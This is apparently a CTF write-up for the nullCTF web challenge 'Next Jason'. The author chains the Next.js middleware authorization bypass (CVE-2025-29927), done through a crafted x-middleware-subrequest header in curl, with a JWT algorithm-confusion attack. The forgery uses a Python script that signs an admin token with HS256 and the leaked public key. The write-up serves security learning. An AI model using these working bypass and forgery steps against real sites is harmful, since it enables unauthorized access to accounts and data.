---
layout: post
title:  "Next Jason"
date:   2025-12-07 16:31:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /nullCTF-next-jason/
---
* TOC
{:toc}

**Title**: Next Jason

**Category**: web

**Author**: Stefan

**Description**: At least JSON has only one pronunciation, unlike GIF. JWT too, I guess?

I get the challenge files and unzip them:
```shell
unzip next_jason.zip  
Archive:  next_jason.zip  
 inflating: .Dockerfile                
 inflating: app/api/getFlag/route.js     
 inflating: app/api/getPublicKey/route.js     
 inflating: app/api/login/route.js     
 inflating: app/favicon.ico            
 inflating: app/globals.css            
 inflating: app/layout.js              
 inflating: app/page.js                
 inflating: app/token/sign/route.js     
 inflating: app/token/verify/route.js     
 inflating: docker-compose.yml         
 inflating: jsconfig.json              
 inflating: middleware.js              
 inflating: next.config.mjs            
 inflating: package.json
```

When first going to the site you get a login page:

![Alt text](/images/simple_login.png)

When looking at the source code in `/next_jason/app/token/verify/route.js`:
```js
function verifyToken(token) {  
    return jwt.verify(token, PUBKEY, { algorithms: ['RS256', 'HS256'] });  
}
```
Looks like the app will accept `HS256`. 

In order to get the public key I used `CVE-2025-29927` ([https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass)):
```shell
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" -s http://926c11cc055d.challs.ctf.r0devnull.team:8001/api/getPublicKey | jq -r  
.PUBKEY > public.pem  

cat public.pem  
-----BEGIN PUBLIC KEY-----  
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4QMizb2gq5HcyqmAyf0i  
ihNDINXX7SG3y5VbzPzj5FEPT3PPwUgXkZESW3e2SxRMlvxW44JZqTwwOPbfGbr7  
f+TolBQaIaMCsl/M/eX8dZAkS9Goui0EYZUQdtTjhLAaXFDp3zvNRlJrpvzGus8C  
DvRbll6JudfdPrB2HhSUOWT5PIGPqbsW8RuWWIj8uxkLZr1zhVy+mr86mP0YisA2  
h134+kIweN4CUYydrvch6mlSgRp+bnJI116egFCNX0JL1ee4oeKsWhlQNapx8FIc  
Bpb8KQ4xfaJudjef0NmSEfo1w5UrhquPN+CoCDUQ1nNKAnRKrFqvZFTND/lR71s8  
QQIDAQAB  
-----END PUBLIC KEY-----
```

Then use the middleware bypass to login and obtain a jwt:

![Alt text](/images/login-cookie.png)

I get a jwt like this:
```shell
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE3NjQ5OTA1NTh9.3ka-uh0l6t-NZfb1DYntjZgC50c6cz-3nKudyQJV7YazDXuiSOJ2OfBCvp3PVUkmKbNCa2FG6bBmCunaePhvRRWcAk32cYJkg_nggzdZPYDMYS83Gst9ta49Df4yByW2nvnrS5m1AsbcA1cVbOG0kJdFsyYR4J66_OFItkW4Vht7p5xPUp1Ah-qQAkCRZ_cQweUQJcT5tz9gm1qfjScM8YhwSRkyiy8ya-W2rF2B1q2hIci06PafearuvveI4xAkOil8eBnj8NhjTiqA8nR5zPn0FOTOZRxr_Z1A6qmgxcX_PSxAlK2fIX1pk6Fog4RNYpAbHPcSBDOTMPKHHQ7naQ
```

Decoded header:
```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```
Decoded payload:
```json
{
  "username": "test",
  "iat": 1764990558
}
```

Now to forge an admin jwt with `HS256` and get the flag from `/api/getFlag` I run this python script:
```python
import json, hmac, hashlib, base64, time

secret = """-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4QMizb2gq5HcyqmAyf0i\nihNDINXX7SG3y5VbzPzj5FEPT3PPwUgXkZESW3e2SxRMlvxW44JZqTwwOPbfGbr7\nf+TolBQaIaMCsl/M/eX8dZAkS9Goui0EYZUQdtTjhLAaXFDp3zvNRlJrpvzGus8C\nDvRbll6JudfdPrB2HhSUOWT5PIGPqbsW8RuWWIj8uxkLZr1zhVy+mr86mP0YisA2\nh134+kIweN4CUYydrvch6mlSgRp+bnJI116egFCNX0JL1ee4oeKsWhlQNapx8FIc\nBpb8KQ4xfaJudjef0NmSEfo1w5UrhquPN+CoCDUQ1nNKAnRKrFqvZFTND/lR71s8\nQQIDAQAB\n-----END PUBLIC KEY-----\n"""

def b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "admin", "iat": int(time.time())}

header_b64 = b64url(json.dumps(header, separators=(',', ':')).encode())
payload_b64 = b64url(json.dumps(payload, separators=(',', ':')).encode())
signing_input = f"{header_b64}.{payload_b64}".encode()

sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
token = f"{header_b64}.{payload_b64}.{b64url(sig)}"

print("Admin token:\n", token)
```

Output:
```shell
Admin token:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzY0OTkwODA3fQ.fisycoY-RBU47snRceXTpRvMPaGmmuVmzYMlh3_nA6k
```

Finally use the forged token in combination with the middleware bypass to get the flag:
```shell
curl -s -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzY0OTkwODA3fQ.fisycoY-RBU47snRceXTpRvMPaGmmuVmzYMlh3_nA6k" \  
 -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \  
 "http://926c11cc055d.challs.ctf.r0devnull.team:8001/api/getFlag"  
{"flag":"nullctf{f0rg3_7h15_cv3_h3h_4f5248e8a9655872}"}
```

`nullctf{f0rg3_7h15_cv3_h3h_4f5248e8a9655872}`